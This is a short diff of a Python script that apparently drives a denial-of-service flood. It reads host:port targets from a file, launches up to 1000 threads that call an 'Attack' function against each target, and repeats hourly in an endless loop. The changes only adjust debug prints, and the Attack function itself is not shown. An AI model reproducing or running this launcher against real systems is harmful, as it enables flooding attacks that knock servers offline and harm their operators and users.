@@ -33,12 +33,13 @@ while 1 == 1:
         for row in f:
             rrow = row.split()
             count_targets = len(rrow)
+            print(count_targets)
             count_threads = int(1000//count_targets)
             for r in rrow:
                 trgt = r.split(":")
                 print ("Starting atack to %s with %s threads on %s port" % (trgt[0], count_threads, trgt[1]))
                 for i in range(count_threads):
-                    print ("Starting %s thread", i)
+                    #print ("Starting %s thread", i)
                     
                     threading.Thread(target=Attack, args=(trgt[0], int(trgt[1]), 1024, timeout,)).start()
     time.sleep(3600)
